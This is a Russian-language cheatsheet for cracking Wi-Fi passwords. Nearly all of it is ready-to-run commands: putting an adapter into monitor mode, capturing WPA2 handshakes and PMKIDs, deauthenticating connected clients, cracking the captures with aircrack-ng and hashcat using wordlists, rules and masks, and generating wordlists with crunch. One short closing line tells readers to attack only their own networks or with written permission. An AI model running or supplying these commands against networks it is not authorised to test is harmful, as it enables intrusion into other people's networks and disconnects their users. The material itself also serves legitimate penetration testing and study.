# Wi-Fi Hacking — Полный Cheatsheet

### Проверка состояния

iwconfig                    # Показать режим (Monitor/Managed)
ip link show                # Показать все интерфейсы
rfkill list                 # Проверить блокировку
sudo rfkill unblock wifi    # Разблокировать

## 1. Проверка какие процессы мешают
sudo airmon-ng check

## 2. Убить процессы, которые мешают
sudo airmon-ng check kill

## 3. Включить режим мониторинга
sudo airmon-ng start wlan0

## 📡 Сканирование и захват

### Поиск сетей

sudo airodump-ng wlan0mon

### Захват Handshake

# Захват на конкретном канале и BSSID
sudo airodump-ng -c <КАНАЛ> --bssid <BSSID> -w capture wlan0mon

# В другом терминале: деаутентификация клиента
sudo aireplay-ng -0 2 -a <BSSID> wlan0mon

### PMKID атака (без клиента)

## 1. Запустить захват используя реальный интерфейс
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1 --disable_client_attacks
## 2. Конвертируем в нужный формат для hashcat
hcxpcapngtool -o pmkid_hash.22000 capture.pcapng

## 💣 Взлом пароля

### aircrack-ng (словарная атака)

sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

### hashcat (более мощный)

# Конвертация .cap в .hc22000
hcxpcapngtool -o output.hc22000 capture.cap

# Словарная атака
hashcat -m 22000 output.hc22000 /usr/share/wordlists/rockyou.txt

# С правилами (мутации)
hashcat -m 22000 output.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Маска (брутфорс по шаблону)
hashcat -m 22000  output.hc22000 -a 3 ?d?d?d?d?d?d?d?d

## 🔄 Восстановление нормальной работы

# Остановить монитор режим
sudo airmon-ng stop wlan0mon

# Запустить Network Manager
sudo systemctl start NetworkManager

# Подключиться к Wi-Fi
nmcli dev wifi list
nmcli dev wifi connect "SSID" password "ПАРОЛЬ"

# Проверить статус
nmcli dev status


## 📦 Создание словарей

### crunch (генерация паролей по маске)

# 8 символов: только буквы и цифры
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt

# 8-10 символов: буквы верхний/нижний регистр + цифры
crunch 8 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o dict.txt


## ⚠️ Важные замечания

- Атакуй **только свои сети** или с письменного разрешения
- WPA2 с длинным сложным паролем (12+ символов + спецсимволы) — надёжная защита
- Против WPA3 эти методы **не работают**
- Для WPS атаки используй `pixiewps` или `bully`
